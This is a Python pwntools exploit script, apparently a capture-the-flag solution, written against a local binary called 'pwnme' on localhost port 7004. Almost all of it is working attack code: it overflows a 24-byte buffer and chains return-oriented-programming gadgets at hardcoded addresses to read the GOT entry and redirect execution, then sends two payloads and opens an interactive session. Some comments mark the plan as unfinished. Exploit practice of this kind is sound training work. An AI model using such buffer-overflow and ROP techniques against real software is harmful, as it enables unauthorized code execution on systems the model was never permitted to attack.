#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwnme")
lib = ELF("./libpwnme.so")

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("localhost", 7004)
    else:
        r = process([exe.path])
        gdb.attach(r, gdbscript='b *pwnme+54\nc')
    return r


def main():
    r = conn()

    # good luck pwning :)
    # plan: read in pwnme_got into rax > sub rax, 0x18 > jmp rax
    gadget0 = p64(0x401191) # : mov rax, qword ptr [rdi] ; ret
    gadget1 = p64(0x4011b2) # : sub rax, rsi ; ret
    gadget2 = p64(0x40109c) # : jmp rax

    rdi = p64(0x40118b) # : pop rdi ; ret
    rsi_r15 = p64(0x401189) # : pop rsi ; pop r15 ; ret

    init_ptr = p64(0x4000f8)
    main = p64(0x401195)

    pwnme_got = p64(0x404018)
    pwnme_plt = p64(0x401030)
    
    # change byte from 0xc7 to 0xaf

    payload = b'A'*24
    payload += p64(0x401199) # main+4
    payload += p64(0x18) + p64(0x18) + gadget1
    payload += gadget2
    print(len(payload))
    r.recvuntil(b'pwn me\n')
    r.send(payload)

    r.recvuntil(b'pwn me\n')
    payload1 = b'B'*24
    payload1 += rdi + pwnme_got + gadget0
    payload1 += rsi_r15
    r.send(payload1)


    r.interactive()


if __name__ == "__main__":
    main()
